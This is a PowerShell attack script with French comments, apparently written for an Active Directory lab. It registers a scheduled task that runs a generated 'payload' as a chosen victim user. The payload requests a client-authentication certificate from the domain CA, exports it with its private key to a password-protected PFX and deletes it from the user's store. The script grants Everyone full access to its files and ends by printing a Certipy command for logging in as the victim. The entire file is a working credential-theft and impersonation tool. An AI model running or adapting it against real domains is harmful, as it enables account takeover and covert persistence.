              
# schtask-certreq.ps1
# Usage : .\schtask-certreq.ps1 -TargetUser "LAB\victime" -CA "DC01.lab.local\LAB-DC01-CA" [-Template "User"] [-OutputDir "C:\Lab"] [-PfxPassword "Lab2026!"] [-Timeout 30]

param(
    [Parameter(Mandatory)][string]$TargetUser,
    [Parameter(Mandatory)][string]$CA,
    [string]$Template = "User",
    [string]$OutputDir = "C:\Lab",
    [string]$TaskName = "MaTaskCert",
    [string]$PfxPassword = "Lab2026!",
    [int]$Timeout = 30
)

$username = $TargetUser.Split("\")[1]
$base = "$OutputDir\certreq"

# Creation du repertoire avec droits pour tout le monde
Write-Host "[*] Creating working directory and setting ACL..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
icacls $OutputDir /grant "Everyone:(OI)(CI)F" | Out-Null

# Suppression des fichiers existants pour eviter les conflits
Write-Host "[*] Cleaning up previous files..." -ForegroundColor Cyan
foreach ($ext in @(".req", ".cer", ".rsp", ".pfx", ".inf", ".ps1", "-new.log", "-submit.log", "-accept.log", "-export.log", "-delstore.log")) {
    Remove-Item -Path "$base$ext" -Force -ErrorAction SilentlyContinue
}

# Pre-creation des fichiers de log uniquement
Write-Host "[*] Pre-creating log files with correct ACL..." -ForegroundColor Cyan
foreach ($ext in @("-new.log", "-submit.log", "-accept.log", "-export.log", "-delstore.log")) {
    New-Item -Path "$base$ext" -ItemType File -Force | Out-Null
    icacls "$base$ext" /grant "Everyone:(F)" | Out-Null
}

# Creation du .inf
Write-Host "[*] Creating .inf file..." -ForegroundColor Cyan
@"
[Version]
Signature="`$Windows NT`$"
[NewRequest]
Subject = "CN=$username"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0
[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2
[RequestAttributes]
CertificateTemplate = $Template
"@ | Set-Content -Path "$base.inf" -Encoding ASCII
icacls "$base.inf" /grant "Everyone:(F)" | Out-Null

# Creation du script PS1 execute dans le contexte de la victime
Write-Host "[*] Creating PS1 payload script..." -ForegroundColor Cyan
@"
`$base = "$base"
`$ca = "$CA"
`$pfxPassword = "$PfxPassword"

certreq -q -new "`$base.inf" "`$base.req" 2>&1 | Out-File "`$base-new.log"
if (-not (Test-Path "`$base.req")) { exit 10 }

certreq -q -f -submit -config "`$ca" "`$base.req" "`$base.cer" 2>&1 | Out-File "`$base-submit.log"
if (-not (Test-Path "`$base.cer")) { exit 20 }

certreq -q -accept "`$base.cer" 2>&1 | Out-File "`$base-accept.log"

`$cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object { `$_.HasPrivateKey -eq `$true } | Sort-Object NotBefore -Descending | Select-Object -First 1
"Cert found : `$(`$cert.Subject) - `$(`$cert.Thumbprint)" | Out-File "`$base-export.log"
if (-not `$cert) { "No cert found in store" | Out-File "`$base-export.log" -Append; exit 30 }

try {
    Export-PfxCertificate -Cert `$cert -FilePath "`$base.pfx" -Password (ConvertTo-SecureString `$pfxPassword -AsPlainText -Force) -CryptoAlgorithmOption AES256_SHA256 2>&1 | Out-File "`$base-export.log" -Append
} catch {
    "Export-PfxCertificate failed : `$_" | Out-File "`$base-export.log" -Append
    exit 40
}

Remove-Item "Cert:\CurrentUser\My\`$(`$cert.Thumbprint)" -Force 2>&1 | Out-File "`$base-delstore.log"
"@ | Set-Content -Path "$base.ps1" -Encoding ASCII
icacls "$base.ps1" /grant "Everyone:(F)" | Out-Null

# Creation et lancement de la tache planifiee
Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $base.ps1" -WorkingDirectory $OutputDir
$principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName

# Attente du resultat
Write-Host "[*] Waiting for execution (max ${Timeout}s)..." -ForegroundColor Cyan
$elapsed = 0
while ($elapsed -lt $Timeout) {
    Start-Sleep -Seconds 2
    $elapsed += 2
    if ((Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult -ne 267009) { break }
}

# Resultat
$result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
if ($result -eq 0 -and (Test-Path "$base.pfx") -and (Get-Item "$base.pfx").Length -gt 0) {
    Write-Host "[+] Success ! PFX available : $base.pfx" -ForegroundColor Green
    Write-Host "[+] PFX password : $PfxPassword" -ForegroundColor Green
    Write-Host "[+] Certipy : certipy-ad auth -pfx $base.pfx -dc-ip <DC_IP> -domain <DOMAIN> -username $username -pfx-password $PfxPassword" -ForegroundColor Green
} else {
    Write-Host "[-] Failed (LastTaskResult: $result)" -ForegroundColor Red
    foreach ($log in @("-new.log", "-submit.log", "-accept.log", "-export.log")) {
        $content = Get-Content "$base$log" -ErrorAction SilentlyContinue
        if ($content) { Write-Host "[*] ${log} :`n$content" -ForegroundColor Yellow }
    }
}

# Nettoyage
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan